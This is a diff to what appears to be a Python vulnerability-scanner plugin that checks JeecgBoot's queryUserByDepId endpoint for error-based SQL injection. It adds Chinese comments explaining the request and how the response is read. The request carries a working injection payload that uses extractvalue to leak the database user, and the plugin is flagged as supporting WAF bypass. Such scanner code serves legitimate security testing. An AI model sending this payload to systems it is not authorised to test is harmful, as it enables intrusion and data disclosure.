@@ -31,17 +31,26 @@ class JeecgSqlInjectQueryUserPlugin(PluginBase):
     supports_waf_bypass = True
 
     def verify(self, target, session):
+        """检测 /sys/user/queryUserByDepId 的 depId 参数是否存在报错型 SQL 注入。
+
+        @param target: 目标站点根 URL
+        @param session: 复用的 HTTP 会话
+        @return: ScanResult —— 命中 CONFIRMED；未命中 SAFE；网络异常 UNKNOWN
+        """
         url = join_url(
             target,
+            # %20 为 URL 编码空格；末尾 -- 注释原 SQL 尾部，使 extractvalue 报错落点可控
             "/jeecg-boot/sys/user/queryUserByDepId?depId=1'%20and%20extractvalue(1,concat(0x7e,user()))--",
         )
         try:
             resp = session.get(url)
             text = resp.text or ""
         except Exception as e:
+            # 网络异常归 UNKNOWN：测不到 ≠ 安全，避免漏报
             print(no("JeecgBoot queryUserByDepId SQL注入（网络异常）"))
             return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
         # 报错注入特征：extractvalue/XPATH/updatexml 任一 + 负向排除普通页面（降误报）
+        # 统一小写再匹配：兼容服务端返回大小写不一的报错文案（XPath/XPATH 等变体）
         if match_positive(
             text.lower(),
             ["extractvalue", "xpath", "updatexml", "syntax error"],
